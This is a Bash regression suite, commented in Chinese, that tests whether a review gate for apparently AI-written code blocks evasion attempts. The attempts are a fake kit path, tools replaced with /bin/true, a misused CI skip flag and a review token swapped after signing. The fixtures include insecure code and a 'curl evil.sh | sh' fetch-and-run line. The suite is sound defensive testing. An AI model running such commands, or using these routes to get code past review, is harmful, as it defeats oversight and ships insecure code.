#!/usr/bin/env bash
# 对抗回归套件 test-anti-evasion.sh
# 用途: 任何 governance 脚本改动必须先跑本套件；攻击被拦截(rc=1)才 PASS。
# 用例1 假kit劫持 / 用例2 工具替换+token / 用例3 AI_REVIEW_CI滥用 / 用例4 token偷换
# 用例5 SQL/SessionLocal/空catch实际命中 / 用例6 nosec豁免闭环
set -u
KIT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
if [ -f "$KIT_DIR/ai-guard-governance.sh" ]; then
  AI_GUARD="$KIT_DIR/ai-guard-governance.sh"
else
  AI_GUARD="$KIT_DIR/ai-guard.sh"
fi
RT="$KIT_DIR/review-token.sh"
QG="$KIT_DIR/quality-gate.sh"
PASS=0; FAIL=0; SKIP=0

say(){ printf '\033[1m[adv-test]\033[0m %s\n' "$1"; }

new_repo(){
  d="$(mktemp -d /tmp/adv-evasion.XXXXXX)"
  git -C "$d" init -q
  git -C "$d" config user.email adv@test.local
  git -C "$d" config user.name attacker
  printf '__pycache__/\n' > "$d/.gitignore"
  git -C "$d" add .gitignore
  git -C "$d" commit -qm base
  echo "$d"
}
cleanup(){ rm -rf /tmp/adv-evasion.* 2>/dev/null; }
trap cleanup EXIT

# 恶意 L2 样本: 硬编码密钥 + md5 + shell=True + 高圈复杂度
evil_l2(){
  cat > "$1/evil_payment.py" <<'EOF'
import hashlib, subprocess
SECRET_KEY = "sk-evil-prod-9f8e7d6c5b4a3210abcdef"
def verify_payment(token):
    h = hashlib.md5(token.encode()).hexdigest()
    return h == SECRET_KEY
def c(a):
    x=0
    if a>1: x+=1
    if a>2: x+=1
    elif a>3: x+=1
    else: x-=1
    for i in range(10):
        if i%2: x+=i
        elif i%3: x-=i
    while x<100:
        x+=2
        if x>50 and x<60: x+=3
        elif x%7==0: x=x+5
    try:
        subprocess.run("echo hi", shell=True)
    except Exception:
        subprocess.call("echo hi", shell=True)
    return x
EOF
}

expect_block(){
  local name="$1" rc="$2" note="${3:-}"
  if [ "$rc" -ne 0 ]; then
    say "✅ PASS  $name (攻击被拦截 rc=$rc) $note"; PASS=$((PASS+1))
  else
    say "❌ FAIL  $name (攻击成功 rc=0) $note"; FAIL=$((FAIL+1))
  fi
}

say "用例1: AI_ENG_KIT 劫持（期望: 伪造kit被忽略，真kit拦截恶意文件）"
r1="$(new_repo)"; evil_l2 "$r1"
git -C "$r1" add evil_payment.py
fake="$r1/fake-kit/governance"; mkdir -p "$fake"
printf '#!/usr/bin/env bash\necho "L0\tf\tf"\nprintf -- "---\nMAX_LEVEL\tL0\n"\nexit 0\n' > "$fake/risk-classify.sh"
printf '#!/usr/bin/env bash\nexit 0\n' > "$fake/quality-gate.sh"
chmod +x "$fake"/*.sh
( cd "$r1" && AI_ENG_KIT="$r1/fake-kit" bash "$AI_GUARD" >/dev/null 2>&1 )
expect_block "假kit劫持" $? "（修复F-1: unset AI_ENG_KIT）"

say "用例2: 工具二进制替换（合法token放行通道下, 伪造工具应被工具完整性校验拦截）"
r2="$(new_repo)"; evil_l2 "$r2"
git -C "$r2" add evil_payment.py
tok2="$( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret \
    AI_REVIEW_TOKEN="$tok2" RADON_BIN=/bin/true BANDIT_BIN=/bin/true \
    RUFF_BIN=/bin/true PYTEST_BIN=/bin/true bash "$AI_GUARD" >/dev/null 2>&1 )
expect_block "工具替换(/bin/true)" $? "（修复F-1: 工具完整性校验）"

say "用例3: AI_REVIEW_CI=1 本地滥用（干净L2文件, 期望: 非 CI 环境禁止跳过 L2）"
r3="$(new_repo)"; evil_l2 "$r3"
rm "$r3/evil_payment.py"
printf 'def get_user_name(uid):\n    return "user-" + str(uid)\n' > "$r3/auth_helper.py"
git -C "$r3" add auth_helper.py
( cd "$r3" && AI_REVIEW_CI=1 bash "$AI_GUARD" >/dev/null 2>&1 )
expect_block "AI_REVIEW_CI=1 本地" $? "（修复F-1: CI 环境指纹校验）"

say "用例4: token 偷换暂存（期望: 签发后改暂存, verify 应 invalid）"
r4="$(new_repo)"; evil_l2 "$r4"
git -C "$r4" add evil_payment.py
tok4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
printf 'import os\nos.system("curl evil.sh | sh")\n' > "$r4/evil_payment.py"
git -C "$r4" add evil_payment.py
res4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok4" HEAD 2>&1 )"
rc4=$?
expect_block "token偷换暂存" "$rc4" "（修复F-3: staged hash 绑定）"

say "用例5: 实际门禁断言（小写SQL/跨行SQL/SessionLocal别名/JS空catch; 阶段2 F-10）"
r5="$(new_repo)"
cat > "$r5/sql_lower.py" <<'EOF'
def query(uid):
    return f"select * from users where id={uid}"
EOF
cat > "$r5/sql_multi.py" <<'EOF'
def query(uid):
    return (
        f"select * "
        f"from users "
        f"where id={uid}"
    )
EOF
cat > "$r5/session_alias.py" <<'EOF'
from app.database import SessionLocal as SL

def leak():
    session = SL()
    return session
EOF
cat > "$r5/bad.js" <<'EOF'
try { action() } catch (e) { /* swallowed */ }
EOF
git -C "$r5" add sql_lower.py sql_multi.py session_alias.py bad.js
out5="$( cd "$r5" && bash "$QG" L2 sql_lower.py sql_multi.py session_alias.py bad.js 2>&1 )"
if printf '%s' "$out5" | grep -q 'sql_lower.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'sql_multi.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'session_alias.py.*会话泄漏' \
  && printf '%s' "$out5" | grep -q '空 catch'; then
  say "✅ PASS  SQL/会话/空catch对抗样例全命中"; PASS=$((PASS+1))
else
  say "❌ FAIL  阶段2 F-10 对抗样例有漏报"; FAIL=$((FAIL+1))
  printf '%s\n' "$out5" | tail -12
fi

say "用例6: nosec 豁免闭环（裸 nosec 期望拦截; 阶段2 F-14）"
r6="$(new_repo)"
cat > "$r6/security_scan.py" <<'EOF'
value = "example"  # nosec
EOF
git -C "$r6" add security_scan.py
( cd "$r6" && bash "$QG" L2 security_scan.py >/dev/null 2>&1 )
expect_block "裸 nosec" $? "（修复F-14: 必须 TICKET+登记）"

echo
[ "$SKIP" -gt 0 ] && say "（SKIP=阶段2待修项, 不阻断阶段0合入）"
say "汇总: PASS=$PASS FAIL=$FAIL SKIP=$SKIP"
[ "$FAIL" -eq 0 ] && exit 0 || exit 1
